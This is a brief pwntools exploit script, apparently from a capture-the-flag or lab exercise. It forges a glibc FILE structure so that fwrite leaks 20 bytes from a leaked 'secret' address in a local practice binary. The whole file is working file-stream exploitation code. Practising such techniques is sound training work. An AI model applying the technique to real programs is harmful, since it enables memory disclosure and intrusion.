from pwn import *


context.arch = "amd64"
context.log_level = "debug"
io = process("./write_example.elf")

io.recvuntil(b'at: ')
secret_addr = int(io.recvline().strip(), 16)
# print('secret addr:', hex(secret_addr))
# secret_addr is located at: 0x5a27a3498010

# overwrite the file struct
fs = FileStructure()
payload = fs.write(secret_addr, 20)
# print("fs.read payload:", payload)
# print(fs)

# hijack buf to secret addr
#  _IO_write_base: 0x5a27a3498010
#  _IO_write_ptr: 0x5a27a3498024
# fileno: 0x1 | so the fwrite output by stdout

io.send(payload)
io.interactive()
